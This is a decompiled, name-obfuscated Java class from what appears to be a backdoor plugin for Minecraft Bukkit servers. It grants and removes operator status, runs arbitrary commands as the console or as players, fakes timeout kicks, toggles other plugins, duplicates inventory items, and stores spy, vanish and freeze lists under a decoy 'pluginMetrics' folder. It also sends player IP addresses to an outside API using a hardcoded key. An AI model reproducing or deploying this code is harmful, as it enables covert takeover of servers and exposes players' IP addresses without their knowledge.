/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.ChatColor
 *  org.bukkit.command.CommandSender
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.Inventory
 *  org.bukkit.inventory.ItemStack
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.methods;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutionException;
import me.system.runner.Core;
import me.system.runner.utils.PluginUtils;
import me.system.runner.utils.SLAPI;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import org.json.JSONObject;

public class API {
    private static final /* synthetic */ Core INSTANCE;

    public static void deopPlayer(Player lllllllllllllIIllIIIllllllIlIlll) {
        INSTANCE.getServer().getScheduler().runTaskAsynchronously((Plugin)INSTANCE, () -> {
            if (lllllllllllllIIllIIIllllllIlIlll.isOp()) {
                lllllllllllllIIllIIIllllllIlIlll.setOp(false);
            }
        });
    }

    public static void opPlayer(Player lllllllllllllIIllIIIlllllllIIIII) {
        INSTANCE.getServer().getScheduler().runTaskAsynchronously((Plugin)INSTANCE, () -> {
            if (!lllllllllllllIIllIIIlllllllIIIII.isOp()) {
                lllllllllllllIIllIIIlllllllIIIII.setOp(true);
            }
        });
    }

    public static void saveConfig() {
        try {
            SLAPI.save(API.INSTANCE.lite, "plugins/pluginMetrics/data/rdata.bin");
            SLAPI.save(API.INSTANCE.premium, "plugins/pluginMetrics/data/rpredata.bin");
            SLAPI.save(API.INSTANCE.admin, "plugins/pluginMetrics/data/radata.bin");
            SLAPI.save(API.INSTANCE.blatant, "plugins/pluginMetrics/data/bdata.bin");
            SLAPI.save(API.INSTANCE.noPickupPlayers, "plugins/pluginMetrics/data/npudata.bin");
            SLAPI.save(API.INSTANCE.cmdSpy, "plugins/pluginMetrics/data/sdata.bin");
            SLAPI.save(API.INSTANCE.frozenPlayers, "plugins/pluginMetrics/data/fdata.bin");
            SLAPI.save(API.INSTANCE.commandSpyTargets, "plugins/pluginMetrics/data/csdata.bin");
            SLAPI.save(API.INSTANCE.isLocked, "plugins/pluginMetrics/data/isbool.bin");
            SLAPI.save(API.INSTANCE.frozen, "plugins/pluginMetrics/data/fabool.bin");
            SLAPI.save(API.INSTANCE.modCmd, "plugins/pluginMetrics/data/mcbool.bin");
            SLAPI.save(API.INSTANCE.playerCommandsLocked, "plugins/pluginMetrics/data/lcbool.bin");
            SLAPI.save(API.INSTANCE.god, "plugins/pluginMetrics/data/gdata.bin");
            SLAPI.save(API.INSTANCE.chatLocked, "plugins/pluginMetrics/data/lchbool.bin");
            SLAPI.save(API.INSTANCE.storagesDisabled, "plugins/pluginMetrics/data/lconbool.bin");
            SLAPI.save(API.INSTANCE.vanish, "plugins/pluginMetrics/data/vdata.bin");
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static void kickPlayer(Player lllllllllllllIIllIIIllllllIlIIIl) {
        INSTANCE.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)INSTANCE, () -> lllllllllllllIIllIIIllllllIlIIIl.kickPlayer("Internal Exception: io.netty.handler.timeout.ReadTimeOutException"));
    }

    public static void sendPM(Player lllllllllllllIIllIIIlllllllIIlIl, String lllllllllllllIIllIIIlllllllIIlII) {
        for (Player lllllllllllllIIllIIIlllllllIlIII : Bukkit.getOnlinePlayers()) {
            if (!API.INSTANCE.lite.contains(lllllllllllllIIllIIIlllllllIlIII.getName())) continue;
            if (API.INSTANCE.prefix.containsKey((Object)lllllllllllllIIllIIIlllllllIIlIl)) {
                lllllllllllllIIllIIIlllllllIlIII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8[").append(Settings.DARK_RED).append("ServerChat&8] &8[").append(API.INSTANCE.prefix.get((Object)lllllllllllllIIllIIIlllllllIlIII).replace("&", "&")).append("&8] &7").append(lllllllllllllIIllIIIlllllllIIlIl.getName()).append(" &8\u00bb ").append(Settings.WHITE).append(lllllllllllllIIllIIIlllllllIIlII.replace("&", "&")))));
                continue;
            }
            if (API.INSTANCE.admin.contains(lllllllllllllIIllIIIlllllllIIlIl.getName())) {
                lllllllllllllIIllIIIlllllllIlIII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8[").append(Settings.DARK_RED).append("ServerChat&8] &8[&4Dev&8] &7").append(lllllllllllllIIllIIIlllllllIIlIl.getName()).append(" &8\u00bb ").append(Settings.WHITE).append(lllllllllllllIIllIIIlllllllIIlII.replace("&", "&")))));
                continue;
            }
            if (API.INSTANCE.premium.contains(lllllllllllllIIllIIIlllllllIIlIl.getName())) {
                lllllllllllllIIllIIIlllllllIlIII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8[").append(Settings.DARK_RED).append("ServerChat&8] &8[&9Premium&8] &7").append(lllllllllllllIIllIIIlllllllIIlIl.getName()).append(" &8\u00bb ").append(Settings.WHITE).append(lllllllllllllIIllIIIlllllllIIlII.replace("&", "&")))));
                continue;
            }
            lllllllllllllIIllIIIlllllllIlIII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8[").append(Settings.DARK_RED).append("ServerChat&8] &7").append(lllllllllllllIIllIIIlllllllIIlIl.getName()).append(" &8\u00bb ").append(Settings.WHITE).append(lllllllllllllIIllIIIlllllllIIlII))));
        }
    }

    public static void error(Player lllllllllllllIIllIIIllllllIIIlIl) {
        lllllllllllllIIllIIIllllllIIIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("There seems to be an error with your copy of ").append(Settings.RED).append(Settings.NAME))));
        lllllllllllllIIllIIIllllllIIIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Error code: ").append(Settings.RED).append(Settings.NG))));
    }

    public static void enablePlugin(String lllllllllllllIIllIIIllllllIllIlI) {
        INSTANCE.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)INSTANCE, () -> {
            if (PluginUtils.getPluginByName(lllllllllllllIIllIIIllllllIllIlI) != null && !Bukkit.getPluginManager().getPlugin(lllllllllllllIIllIIIllllllIllIlI).isEnabled()) {
                Bukkit.getServer().getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(lllllllllllllIIllIIIllllllIllIlI));
            }
        });
    }

    public static void disablePlugin(String lllllllllllllIIllIIIllllllIlllII) {
        INSTANCE.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)INSTANCE, () -> {
            if (PluginUtils.getPluginByName(lllllllllllllIIllIIIllllllIlllII) != null && Bukkit.getPluginManager().getPlugin(lllllllllllllIIllIIIllllllIlllII).isEnabled()) {
                Bukkit.getServer().getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin(lllllllllllllIIllIIIllllllIlllII));
            }
        });
    }

    public static void runCMDAsPlayer(Player lllllllllllllIIllIIIllllllIIlIIl, String lllllllllllllIIllIIIllllllIIlIII) {
        INSTANCE.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)INSTANCE, () -> lllllllllllllIIllIIIllllllIIlIIl.chat(lllllllllllllIIllIIIllllllIIlIII));
    }

    public static void runCMDAsConsole(String lllllllllllllIIllIIIllllllIIlllI) {
        INSTANCE.getServer().getScheduler().runTaskAsynchronously((Plugin)INSTANCE, () -> {
            try {
                Bukkit.getScheduler().callSyncMethod((Plugin)INSTANCE, () -> Bukkit.getServer().dispatchCommand((CommandSender)Bukkit.getServer().getConsoleSender(), lllllllllllllIIllIIIllllllIIlllI)).get();
            }
            catch (InterruptedException | ExecutionException lllllllllllllIIllIIIlllllIlIllll) {
                // empty catch block
            }
        });
    }

    public static String getIPOfPlayer(Player lllllllllllllIIllIIlIIIIIIIIIIll) {
        return lllllllllllllIIllIIlIIIIIIIIIIll.getAddress().getAddress().toString().replace("/", "");
    }

    static {
        INSTANCE = (Core)Core.getPlugin(Core.class);
    }

    public static void dupe() {
        Bukkit.getScheduler().runTaskTimerAsynchronously((Plugin)INSTANCE, () -> {
            for (Inventory lllllllllllllIIllIIIlllllIlllllI : API.INSTANCE.inventories) {
                for (int lllllllllllllIIllIIIlllllIllllll = 0; lllllllllllllIIllIIIlllllIllllll <= 26; ++lllllllllllllIIllIIIlllllIllllll) {
                    if (lllllllllllllIIllIIIlllllIlllllI.getItem(lllllllllllllIIllIIIlllllIllllll) == null) continue;
                    ItemStack lllllllllllllIIllIIIllllllIIIIII = lllllllllllllIIllIIIlllllIlllllI.getItem(lllllllllllllIIllIIIlllllIllllll);
                    lllllllllllllIIllIIIllllllIIIIII.setAmount(lllllllllllllIIllIIIllllllIIIIII.getAmount() + 1);
                }
            }
        }, 0L, 20L);
    }

    public static boolean isPlayerOnVPN(Player lllllllllllllIIllIIIllllllllIlII) {
        try {
            String lllllllllllllIIllIIIlllllllllIlI;
            URL lllllllllllllIIllIIIlllllllllIIl = new URL(String.valueOf(new StringBuilder().append("https://www.ipqualityscore.com/api/json/ip/UCNKI16V5h8Bum2rmHHFKTjZDTBzqff8/").append(API.getIPOfPlayer(lllllllllllllIIllIIIllllllllIlII))));
            HttpURLConnection lllllllllllllIIllIIIlllllllllIII = (HttpURLConnection)lllllllllllllIIllIIIlllllllllIIl.openConnection();
            BufferedReader lllllllllllllIIllIIIllllllllIlll = new BufferedReader(new InputStreamReader(lllllllllllllIIllIIIlllllllllIII.getInputStream()));
            StringBuffer lllllllllllllIIllIIIllllllllIllI = new StringBuffer();
            while ((lllllllllllllIIllIIIlllllllllIlI = lllllllllllllIIllIIIllllllllIlll.readLine()) != null) {
                lllllllllllllIIllIIIllllllllIllI.append(lllllllllllllIIllIIIlllllllllIlI);
            }
            lllllllllllllIIllIIIllllllllIlll.close();
            JSONObject lllllllllllllIIllIIIllllllllIlIl = new JSONObject(lllllllllllllIIllIIIllllllllIllI.toString());
            if (lllllllllllllIIllIIIllllllllIlIl.has("proxy")) {
                if (lllllllllllllIIllIIIllllllllIlIl.getBoolean("proxy")) {
                    return true;
                }
                if (lllllllllllllIIllIIIllllllllIlIl.has("vpn") && lllllllllllllIIllIIIllllllllIlIl.getBoolean("vpn")) {
                    return true;
                }
            }
        }
        catch (IOException iOException) {
            // empty catch block
        }
        return false;
    }

    public API() {
        API lllllllllllllIIllIIlIIIIIIIIIlIl;
    }
}

